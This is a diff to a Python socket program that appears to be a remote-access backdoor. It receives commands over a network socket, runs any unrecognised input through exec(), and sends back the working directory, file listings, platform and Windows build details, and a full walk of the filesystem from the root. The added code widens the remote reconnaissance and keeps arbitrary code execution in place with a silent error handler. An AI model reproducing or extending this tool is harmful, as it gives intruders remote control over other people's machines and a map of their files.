@@ -1,5 +1,6 @@
 import socket
 import os
+import sys
 
 connected = False
 
@@ -43,12 +44,65 @@ def execute(co):
     for x in colist:
         new += x
     newsplit = new.split()
+    print("[CLIENT]:/" + new)
     if new == "quit":
         server_socket.close()
     elif newsplit[0] == "send_file":
         send_file(newsplit[1])
+    if new == "dirname":
+        #out = subprocess.run(("dir", "/W"), capture_output=True)
+        out = os.getcwd()
+        print("[*]Output: " + out)
+        client_socket.send(bytes(out, "utf8"))
+    elif new == "list":
+        out = os.listdir()
+        client_socket.send(bytes("---- direct of server ----", "utf8"))
+        client_socket.send(bytes("\n", "utf8"))
+        for entry in out:
+            client_socket.send(bytes(entry + "\n", "utf8"))
+        client_socket.send(bytes("---- end of server directory ----", "utf8"))
+    elif new == "platform":
+        out = sys.platform
+        if out == "win32":
+            x = sys.getwindowsversion()
+            out += " -version {}.{} -build {}".format(x.major, x.minor, x.build)
+        client_socket.send(bytes(out, "utf8"))
+    elif new == "walk":
+        counter = 0
+        way = "\n---------------- Walk ----------------"
+        for root, dirs, files in os.walk("."):
+            way += "Direcory: "+root+"\n"
+            way += "----- Minor Directorys -----\n"
+            for d in dirs:
+                way += d+"\n"
+            way += "--- Files ---\n"
+            for f in files:
+                way += f+"\n"
+            counter += 1
+        way += "\n\n" + str(counter) + " Directorys"
+        client_socket.send(bytes(way, "utf8"))
+        
+    elif new == "walk_root":
+        counter = 0
+        way = "\n---------------- Walk ----------------"
+        for root, dirs, files in os.walk("/"):
+            way += "Direcory: "+root+"\n"
+            way += "----- Minor Directorys -----\n"
+            for d in dirs:
+                way += d+"\n"
+            way += "--- Files ---\n"
+            for f in files:
+                way += f+"\n"
+            counter += 1
+        way += "\n\n" + str(counter) + " Directorys"
+        client_socket.send(bytes(way, "utf8"))
+    
     else:
-        exec(new)
+        try:
+            exec(new)
+        except:
+            client_socket.send(bytes("", "utf8"))
+        
         
 
     
@@ -105,4 +159,7 @@ while True:
         print("[*]Connection Lost!\n")
         connected = False
            
+    
+    
 
+#LAPTOP-FHIN1JKR
